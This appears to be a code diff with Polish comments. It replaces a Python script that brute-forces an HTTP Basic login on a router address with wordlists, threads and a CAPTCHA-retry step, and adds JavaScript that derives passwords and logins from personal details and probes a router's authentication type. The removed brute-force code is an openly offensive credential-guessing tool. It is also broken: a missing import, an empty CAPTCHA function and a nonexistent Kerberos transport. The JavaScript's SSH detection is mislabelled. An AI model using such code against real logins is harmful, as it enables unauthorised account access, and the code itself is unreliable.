@@ -1,95 +1,103 @@
-# -*- coding: utf-8 -*-
+// Zaimportuj moduł crypto
+const crypto = require('crypto');
+const rp = require('request-promise');
+const cheerio = require('cheerio');
 
-from concurrent.futures import ThreadPoolExecutor
-from requests import Session
-from requests_kerberos import KerberosTransport
+// Zdefiniuj dane, na podstawie których chcesz generować hasła i loginy
+const data = {
+  name: 'Jan',
+  surname: 'Kowalski',
+  birthdate: '01-01-2000',
+  email: 'jan.kowalski@example.com'
+};
 
-# Adres URL do logowania HTTP
-http_login_url = 'http://192.168.1.1'
+// Zdefiniuj funkcję, która tworzy losowy ciąg znaków o danej długości
+function randomString(length) {
+  // Utwórz bufor o danej długości
+  const buffer = crypto.randomBytes(length);
+  // Zamień bufor na ciąg znaków w kodowaniu base64
+  const string = buffer.toString('base64');
+  // Usuń znaki specjalne i zwróć ciąg znaków
+  return string.replace(/[^a-zA-Z0-9]/g, '');
+}
 
-# Ścieżka do pliku ze słownikiem użytkowników
-users_file = 'users.txt'
+// Zdefiniuj funkcję, która tworzy hasło na podstawie danych
+function generatePassword(data) {
+  // Połącz dane w jeden ciąg znaków
+  const input = Object.values(data).join('');
+  // Utwórz skrót SHA-256 z ciągu znaków
+  const hash = crypto.createHash('sha256').update(input).digest('hex');
+  // Zwróć pierwsze 12 znaków skrótu jako hasło
+  return hash.slice(0, 12);
+}
 
-# Ścieżka do pliku ze słownikiem haseł
-passwords_file = 'passwords.txt'
+// Zdefiniuj funkcję, która tworzy login na podstawie danych
+function generateLogin(data) {
+  // Użyj pierwszej litery imienia i pierwszych 5 liter nazwiska
+  const prefix = data.name[0] + data.surname.slice(0, 5);
+  // Użyj losowego ciągu znaków o długości 4 jako przyrostek
+  const suffix = randomString(4);
+  // Zwróć połączenie przedrostka i przyrostka jako login
+  return prefix + suffix;
+}
 
-# Liczba wątków
-threads = 10
+// Zdefiniuj stałą
+const router_url = 'http://192.168.1.1';
 
-# Mechanizm CAPTCHA
-captcha_url = 'https://www.example.com/captcha'
+// Zdefiniuj funkcję pomocniczą
+function detect_auth_type(router_url) {
+  // Utwórz obiekt z opcjami zapytania
+  const options = {
+    uri: router_url,
+    resolveWithFullResponse: true, // zwróć pełną odpowiedź
+    simple: false, // nie rzucaj błędu dla kodów 4xx i 5xx
+    auth: { // ustaw opcje autoryzacji
+      user: 'user', // przykładowa nazwa użytkownika
+      pass: 'pass', // przykładowe hasło
+      sendImmediately: false // wyślij nagłówek autoryzacji tylko gdy jest wymagany
+    }
+  };
+  // Wyślij zapytanie HTTP z opcjami
+  return rp(options)
+    .then(response => {
+      // Sprawdź kod odpowiedzi i nagłówek WWW-Authenticate
+      if (response.statusCode == 401 && response.headers['www-authenticate']) {
+        // Zwróć typ autoryzacji z nagłówka
+        return response.headers['www-authenticate'].split(' ')[0];
+      } else if (response.statusCode == 200) {
+        // Załaduj ciało odpowiedzi jako HTML
+        const $ = cheerio.load(response.body);
+        // Sprawdź, czy istnieje element form
+        if ($('form').length > 0) {
+          // Zwróć 'HTTP Form'
+          return 'HTTP Form';
+        } else if (response.headers['server'].startsWith('SSH')) {
+          // Zwróć 'SSH'
+          return 'SSH';
+        } else {
+          // Zwróć 'Unknown'
+          return 'Unknown';
+        }
+      } else {
+        // Zwróć 'None'
+        return 'None';
+      }
+    })
+    .catch(error => {
+      // Obsłuż błąd
+      console.error(error);
+    });
+}
 
-# Mechanizm blokowania
-block_threshold = 5
+// Wygeneruj i wyświetl hasło i login na podstawie danych
+const password = generatePassword(data);
+const login = generateLogin(data);
+console.log(`Hasło: ${password}`);
+console.log(`Login: ${login}`);
 
-# Opcjonalny mechanizm uwierzytelniania Kerberosa
-kerberos_service = 'HTTP/www.example.com'
-kerberos_realm = 'EXAMPLE.COM'
-
-# Funkcja do wczytywania słownika
-def read_dictionary(file_path):
-    with open(file_path, 'r') as f:
-        return [line.strip() for line in f]
-
-# Funkcja do przeprowadzania ataku brute force na logowanie HTTP
-def brute_force_http_login(http_login_url, users, passwords, threads, captcha_url, block_threshold, kerberos_service=None, kerberos_realm=None):
-    session = Session()
-    if kerberos_service is not None and kerberos_realm is not None:
-        session.transport = KerberosTransport(kerberos_service, kerberos_realm)
-
-    blocked_users = set()
-
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        for user in users:
-            for password in passwords:
-                credentials = f'{user}:{password}'
-
-                def try_login(user, password, credentials):
-                    try:
-                        # Wyślij zapytanie HTTP z danymi logowania
-                        response = session.get(http_login_url, headers={'Authorization': f'Basic {base64.b64encode(credentials.encode("utf-8")).decode("ascii")}'})
-
-                        # Sprawdź, czy odpowiedź jest poprawna
-                        if response.status_code == 200:
-                            print(f'Znaleziono poprawne dane logowania: {credentials}')
-                            return True
-
-                        # Sprawdź, czy jest wymagane CAPTCHA
-                        if response.status_code == 403 and 'captcha' in response.headers:
-                            # Rozwiąż CAPTCHA
-                            captcha_answer = solve_captcha(captcha_url)
-
-                            # Wyślij ponownie zapytanie HTTP z rozwiązaniem CAPTCHA
-                            response = session.post(http_login_url, headers={'Authorization': f'Basic {base64.b64encode(credentials.encode("utf-8")).decode("ascii")}', 'Captcha-Answer': captcha_answer})
-
-                            # Sprawdź, czy odpowiedź jest poprawna
-                            if response.status_code == 200:
-                                print(f'Znaleziono poprawne dane logowania: {credentials}')
-                                return True
-
-                    except Exception as e:
-                        print(f'Wystąpił błąd: {e}')
-
-                    return False
-
-                future = executor.submit(try_login, user, password, credentials)
-
-                # Zablokuj użytkownika po określonej liczbie nieudanych prób logowania
-                if len(blocked_users) < block_threshold and not future.result():
-                    blocked_users.add(user)
-
-                # Sprawdź, czy użytkownik został zablokowany
-                if user in blocked_users:
-                    break
-
-    print(f'Sprawdzono {len(users) * len(passwords)} kombinacji. Zablokowano {len(blocked_users)} użytkowników.')
-
-# Funkcja do rozwiązywania CAPTCHA (implementacja zależy od konkretnego mechanizmu CAPTCHA)
-def solve_captcha(captcha_url):
-    # ...
-
-# Główna funkcja
-users = read_dictionary(users_file)
-passwords = read_dictionary(passwords_file)
-
-brute_force_http_login(http_login_url, users, passwords, threads, captcha_url, block_threshold)
+// Test funkcji detect_auth_type
+detect_auth_type(router_url)
+  .then(result => {
+    // Wyświetl wynik
+    console.log(result);
+  });
